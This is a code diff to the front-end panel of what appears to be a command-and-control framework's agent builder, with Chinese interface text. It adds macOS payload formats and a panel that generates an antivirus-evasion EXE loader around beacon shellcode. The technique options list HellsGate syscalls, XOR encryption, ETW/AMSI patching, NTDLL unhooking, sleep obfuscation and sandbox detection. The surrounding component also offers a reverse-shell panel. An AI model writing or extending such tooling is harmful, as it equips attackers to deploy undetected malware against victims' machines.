@@ -4,7 +4,7 @@
 // c2-agent-builder.tsx — Agent 生成器面板：参数 → API → 下载
 import React from "react";
 import { api } from "@/lib/api";
-import { TerminalIcon, XIcon, PackageIcon, DownloadIcon, CogIcon } from "lucide-react";
+import { TerminalIcon, XIcon, PackageIcon, DownloadIcon, CogIcon, ShieldIcon } from "lucide-react";
 
 // ---------- 反弹 Shell ----------
 export function C2ShellPanel({ beaconId }: { beaconId: string }) {
@@ -134,6 +134,8 @@ const AGENT_FORMATS: { value: string; label: string }[] = [
   { value: "linux_elf", label: "Linux x64 ELF" },
   { value: "linux_elf_g", label: "Linux x64 ELF（调试版）" },
   { value: "linux_arm64", label: "Linux ARM64 ELF" },
+  { value: "darwin_amd64", label: "macOS Intel（x64）" },
+  { value: "darwin_arm64", label: "macOS Apple Silicon（ARM64）" },
   { value: "shellcode", label: "Shellcode（donut）" },
 ];
 
@@ -141,6 +143,7 @@ export function C2AgentBuilder() {
   const [listeners, setListeners] = React.useState<ListenerLite[]>([]);
   const [listenerId, setListenerId] = React.useState("");
   const [format, setFormat] = React.useState("amd64_exe");
+  const [technique, setTechnique] = React.useState("t1_classic");
   const [interval_, setInterval_] = React.useState(5);
   const [jitter, setJitter] = React.useState(20);
   const [result, setResult] = React.useState<{ url: string; filename: string; size: number; sha256: string; server: string } | null>(null);
@@ -176,6 +179,18 @@ export function C2AgentBuilder() {
       }
       const url = URL.createObjectURL(blob);
       setResult({ url, filename, size: blob.size, sha256, server });
+    } catch (e) {
+      setErr(e instanceof Error ? e.message : String(e));
+    } finally { setBusy(false); }
+  };
+
+  const loaderBuild = async () => {
+    if (!listenerId) { setErr("请先选择监听器"); return; }
+    setBusy(true); setErr(""); setResult(null);
+    try {
+      const { blob, filename } = await api.c2LoaderGenerate({ listener_id: listenerId, technique });
+      const url = URL.createObjectURL(blob);
+      setResult({ url, filename, size: blob.size, sha256: "", server: "" });
     } catch (e) {
       setErr(e instanceof Error ? e.message : String(e));
     } finally { setBusy(false); }
@@ -228,6 +243,24 @@ export function C2AgentBuilder() {
       >
         <CogIcon className="size-4" /> {busy ? "生成中…" : "生成 Agent 载荷"}
       </button>
+
+      <div className="rounded border border-amber-500/40 bg-amber-500/5 p-3 space-y-2">
+        <div className="flex items-center gap-2 text-xs font-semibold text-amber-600">
+          <ShieldIcon className="size-4" /> 免杀加载器（shellcode → 随机密钥模板 → 重编译）
+        </div>
+        <select className="w-full rounded border bg-transparent p-2 text-sm" value={technique} onChange={(e) => setTechnique(e.target.value)}>
+          <option value="t0_drop">T0 稳定：内嵌加密 beacon → 随机名落盘执行（回连最可靠）</option>
+          <option value="t1_classic">T1 经典：HellsGate + DoubleXOR + IPv4 + ETW/AMSI 补丁 + NTDLL 脱钩</option>
+          <option value="t3_sleep">T3 强免杀：+ VEH 保护 + 睡眠混淆 + 深度沙箱检测 + 行为延迟</option>
+        </select>
+        <button
+          className="flex items-center gap-2 rounded bg-amber-600 px-4 py-2 text-white hover:bg-amber-500 disabled:opacity-40"
+          onClick={loaderBuild}
+          disabled={busy || listeners.length === 0}
+        >
+          <CogIcon className="size-4" /> {busy ? "编译中（首次需下载依赖，约 1-3 分钟）…" : "生成免杀 EXE"}
+        </button>
+      </div>
 
       {result && (
         <div className="space-y-1 rounded border border-green-500/40 bg-green-500/10 p-3">
